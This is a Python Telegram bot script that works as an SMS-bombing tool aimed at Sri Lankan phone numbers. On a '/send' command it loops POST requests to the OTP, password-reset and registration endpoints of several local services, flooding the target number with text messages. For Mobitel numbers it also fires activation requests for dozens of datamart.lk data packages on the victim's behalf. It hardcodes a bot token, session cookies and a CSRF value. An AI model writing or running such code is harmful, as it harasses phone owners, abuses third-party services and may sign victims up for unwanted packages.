

import telebot

# Replace 'YOUR_API_TOKEN' with your actual API token
bot = telebot.TeleBot('7243297008:AAH_RWUZSxPlj94KvEybe6d1nSSIOXGgjV4')

import requests
bot_token2 = '7243297008:AAH_RWUZSxPlj94KvEybe6d1nSSIOXGgjV4'



urlx = f'https://api.telegram.org/bot{bot_token2}/sendMessage'

own_id = '5673837951'
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    # Check if the message is a text message
    if message.content_type == 'text':
        sender_id = message.from_user.id
        # Retrieve the last text message sent by the bot
        last_text_message = message.text

        if last_text_message.startswith('/start'):
            print("start ", sender_id)

            stmsg = f'Hello ☺️🥰\n'\
                    f'Get help send /help'\

            bot.send_message(sender_id, stmsg)
            import requests

            message_text = f"start: {sender_id}"
            params = {
                'chat_id': own_id,
                'text': message_text
                 }

            response = requests.post(urlx, json=params)

            if response.status_code == 200:
                print('Message sent successfully!')
            else:
                print('Failed to send the message.')

        if last_text_message.startswith('/help'):

            hlpmsg = f' /send [Number]  [returning times ,Enter 1 or 2]\n'\
                    f' You can send 15 msgs one time with mobitel\n'\
                    f'EG  /send  0712345678 1\n'\
                    f'Have a nice day\n'\

            bot.send_message(sender_id, hlpmsg)





                    # Check if the message starts with the special command
        if last_text_message.startswith('/send'):
                        # Split the message into words
            words = last_text_message.split()
            sender_id = message.from_user.id
            i=0            # Check if the message has at least 3 words (command + number + text)
            if len(words) >= 3:
                            # Extract the number and text following the command
                number = words[1]
                text = ' '.join(words[2:])  # Join remaining words as text

                print("Number:", number)
                print("Text:", text)
                print("Sender ID:", sender_id)
                import requests

                num = number

                start = 1
                endnu = int(text)
                if endnu <= 4:
                    end= endnu

                else:
                    end = 1
                    bot.send_message(sender_id, f"wrong data found, run normal ")


                print(end)


                for i in range (start, end + 1):

                    if len(num) == 10 and num.isdigit():

                        bot.send_message(sender_id, f"Wait few minutes ☺️ ")


                        import requests
                        import json

                        suc=0
                        fail=0
                        sucm=0
                        failm=0
                        payloadedupr = {"variables":{},"query":"mutation {\n  otpRequest(identifier: \"0000\") {\n    token\n    __typename\n  }\n}\n"}
                        new_identifier = num
                        payloadedupr["query"] = payloadedupr["query"].replace("0000", new_identifier)
                        payloadedu = json.dumps(payloadedupr, indent=2)


                        headershelakuru = {
                        'Connection':'keep-alive',
                        'Content-Length':'72',
                        'sec-ch-ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                        'Accept':'*/*',
                        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                        'X-Requested-With':'XMLHttpRequest',
                        'sec-ch-ua-mobile':'?0',
                        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                        'sec-ch-ua-platform':'"Windows"',
                        'Origin':'https://www.helakuru.lk',
                        'Sec-Fetch-Site':'same-origin',
                        'Sec-Fetch-Mode':'cors',
                        'Sec-Fetch-Dest':'empty',
                        'Referer':'https://www.helakuru.lk/',
                        'Accept-Encoding':'gzip, deflate, br',
                        'Accept-Language':'en-GB,en-US;q=0.9,en;q=0.8',
                        'Cookie':'esp-ak=d2fd530d855e00f8651acefbe79a4a7b; _ga_L6TZ42PWTM=GS1.1.1692450420.1.0.1692450420.0.0.0; _ga=GA1.2.2080782849.1692450421; _gid=GA1.2.210111678.1692450429'}
                        payloadhelakuru={
                            'contact': num,
                            'os_type':'apple',
                            'csrf':'d2fd530d855e00f8651acefbe79a4a7b',
                        }
                        payloadhelakuru1={
                            'contact':num,
                            'os_type':'huawei',
                            'csrf':'d2fd530d855e00f8651acefbe79a4a7b',
                        }
                        payloadhelakuru2={
                            'contact':num,
                            'os_type':'android',
                            'csrf':'d2fd530d855e00f8651acefbe79a4a7b',
                        }
                        headerssasipinstitute = {
                        'Connection':'keep-alive',
                        'Content-Length':'17',
                        }
                        payloadsasipinstitute = {
                            'mobile':num,
                        }
                        payloadhutch={'__JSON_OBJ_STR_REQUEST_PARAM__':'{"ACC_NBR": "","MSG_TYPE":"HUTCH_VALIDATE_CODE","NEW_OTP":1}'}
                        payload_dict = json.loads(payloadhutch['__JSON_OBJ_STR_REQUEST_PARAM__'])
                        payload_dict['ACC_NBR'] = num
                        updated_payload = json.dumps(payload_dict)
                        payloadhutch['__JSON_OBJ_STR_REQUEST_PARAM__'] = updated_payload
                        payloadhutch2={'__JSON_OBJ_STR_REQUEST_PARAM__':'{"ACC_NBR":"","MSG_TYPE":"REGISTER"}'}
                        payload_dict2 = json.loads(payloadhutch2['__JSON_OBJ_STR_REQUEST_PARAM__'])
                        payload_dict2['ACC_NBR'] = num
                        updated_payload2 = json.dumps(payload_dict2)
                        payloadhutch2['__JSON_OBJ_STR_REQUEST_PARAM__'] = updated_payload2







                        for k in range (1, 5):
                            responsehelakuruapple = requests.request("POST", "https://www.helakuru.lk/download/send", headers=headershelakuru, data=payloadhelakuru)
                            responsehelakuruhuawei = requests.request("POST", "https://www.helakuru.lk/download/send", headers=headershelakuru, data=payloadhelakuru1)
                            responsehelakuruandroid = requests.request("POST", "https://www.helakuru.lk/download/send", headers=headershelakuru, data=payloadhelakuru2)
                            responseedumixusaspela = requests.request("POST", "https://api-usaspela.edumix.lk/api/graphql", data=payloadedupr)
                            responseedumixlms = requests.request("POST", "https://api-lms.edumix.lk/api/graphql", data=payloadedupr)
                            responseedumixcharitha = requests.request("POST", "https://charitha.databoxtech.lk/api/graphql", data=payloadedupr)
                            responseedumixeconasela = requests.request("POST", "https://api-econasela.edumix.lk/api/graphql",data=payloadedupr)
                            responsesasipinstitute = requests.request("POST", "https://www.sasipinstitute.com/forgotpassword", headers=headerssasipinstitute, data=payloadsasipinstitute)
                            responsehutch1 = requests.request("POST", "https://selfcare.hutch.lk/selfcare/sendMsgCode.do",  data=payloadedupr)
                            responsehutch2 = requests.request("POST", "https://selfcare.hutch.lk/selfcare/sendMsgCode.do",  data=payloadedupr)



                            if responseedumixusaspela.status_code == 200:
                                print('usaspela Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail+ 1
                                print('usaspela Failed to send the message.')
                            if responseedumixlms.status_code == 200:
                                print('mixlms Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('mixlms Failed to send the message.')
                            if responseedumixcharitha.status_code == 200:
                                print('charitha Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('charitha Failed to send the message.')
                            if responseedumixeconasela.status_code == 200:
                                print('conasela Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('conasela Failed to send the message.')
                            if responsesasipinstitute.status_code == 200:
                                print('sesasipinstitute Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('sesasipinstitute Failed to send the message.')
                            if responsehutch1.status_code == 200:
                                print('hutch 1 Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('hutch 1 Failed to send the message.')
                            if responsehutch2.status_code == 200:
                                print('hutch 2 Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('hutch 2 Failed to send the message.')

                            if responsehelakuruapple.status_code == 200:
                                print('helakuruapple Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('helakuruapple Failed to send the message.')
                            if responsehelakuruhuawei.status_code == 200:
                                print('helakuruhuawei Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('helakuruhuawei Failed to send the message.')

                            if responsehelakuruandroid.status_code == 200:
                                print('helakuruandroid Message sent successfully!')
                                suc = suc + 1
                            else:
                                fail = fail + 1
                                print('helakuruandroid Failed to send the message.')

                            print(f"No. of Failed Msg {fail}")
                            print(f'No. successfull Msg:-{suc}')














                        if len(num) == 10 and num.isdigit():
                            if num[:3] == '070' or num[:3] == '071':

                                datadatamartotpForViewUsage={
                                    'serviceNum': num,
                                }

                                datadatamartactPostConfirm1={
                                    'serviceNumber': num,
                                    'reserviceNumber': num,
                                    'packageRefNo' : '265',

                                }

                                responsedatamartactPostConfirm = requests.post('https://www.datamart.lk/home/actPostConfirm', data=datadatamartactPostConfirm1)

                                if responsedatamartactPostConfirm.status_code == 200:
                                    print('datamartactPostConfirm Message sent successfully!')
                                    bot.send_message(sender_id, f"Oh! Mobitel Number, I like it ☺️ ")
                                    sucm = sucm + 1
                                else:
                                    failm = failm + 1
                                    print('datamartactPostConfirm Failed to send the message.')



                                asd = responsedatamartactPostConfirm.text




                                if 'You have entered an invalid mobile number.' in asd:
                                    print(f"You have entered an invalid mobile number ")
                                    bot.send_message(sender_id, f"You have entered an invalid mobile number 😌 ")
                                else:
                                    print(f"valid mobile number")
                                    responsedatamartotpForViewUsage = requests.post('https://www.datamart.lk/home/otpForViewUsage', data=datadatamartotpForViewUsage)
                                    if responsedatamartotpForViewUsage.status_code == 200:
                                        print('datamartotpForViewUsage Message sent successfully!')
                                        sucm = sucm + 1
                                    else:
                                        failm = failm+ 1
                                        print('datamartotpForViewUsage Failed to send the message.')




                                    if 'prepaid service number' in asd:
                                        bot.send_message(sender_id, f"You have entered prepaid service number")
                                        print(f"You have entered prepaid service number")
                                        pkg = "129 130 265 220 220 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 374 375 376 377 378 379 380 381 382 383 384 385 387 388 389 390 391 392 393 394 395 396 400 401 402 403 404 405 406 649"
                                        #220 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 374 375 376 377 378 379 380 381 382 383 384 385 387 388 389 390 391 392 393 394 395 396 400 401 402 403 404 405 406 649"
                                        number_list = pkg.split()

                                        for pkg in number_list:


                                            datadatamartactPreConfirm ={
                                            'serviceNumber': num,
                                            'reserviceNumber': num,
                                            'packageRefNo' : pkg,
                                            f'selector{pkg}' : 'a',
                                            'paymentMethod' : 'a',
                                            }
                                            responsedatamartactPreConfirm = requests.post('https://www.datamart.lk/home/actPreConfirm', data=datadatamartactPreConfirm)
                                            if responsedatamartactPreConfirm.status_code == 200:
                                                print(f'datamartactPreConfirm {pkg} Message sent successfully!')
                                                sucm = sucm + 1

                                            else:
                                                failm = failm + 1
                                                print(f'datamartactPreConfirm {pkg} Failed to send the message.')

                                    else:

                                        bot.send_message(sender_id, f"You have entered postpaid service number")
                                        print(f"You have entered postpaid service number")
                                        pkg = "266 267 268 269 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 29 291 292 293 294 295 296 297 298 299"
                                        #268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 29 291 292 293 294 295 296 297 298 299"
                                        number_list = pkg.split()

                                        for pkg in number_list:


                                            datadatamartactPostConfirm={
                                            'serviceNumber': num,
                                            'reserviceNumber': num,
                                            'packageRefNo' : pkg,



                                        }
                                        responsedatamartactPostConfirm = requests.post('https://www.datamart.lk/home/actPostConfirm', data=datadatamartactPostConfirm)
                                        print(responsedatamartactPostConfirm)
                                        if responsedatamartactPostConfirm.status_code == 200:
                                            print(f'datamartactPostConfirm {pkg} Message sent successfully!')
                                            sucm = sucm + 1
                                        else:
                                            failm = failm + 1
                                            print(f'datamartactPostConfirm {pkg} Failed to send the message.')
                                print(sucm)
                                print(failm)
                                bot.send_message(sender_id, f"Mobitel {sucm} Messages sent successfully!  😏")
                                bot.send_message(sender_id, f"Mobitel {failm} Failed to send the message.  ")
                                suc = sucm
                                fail= failm


















                        print(f"No. of Failed Msg {fail}")
                        print(f'No. successfull Msg:-{suc}')
                        bot.send_message(sender_id, f'No. Total successfull Msg:- {suc}  😏')
                        bot.send_message(sender_id, f'No. Total of Failed Msg {fail}')
                        bot.send_message(sender_id, f" MS {i} successfully!")
                    else:
                        bot.send_message(sender_id, f" Enter valid number 😥")



































                   # break

bot.polling()
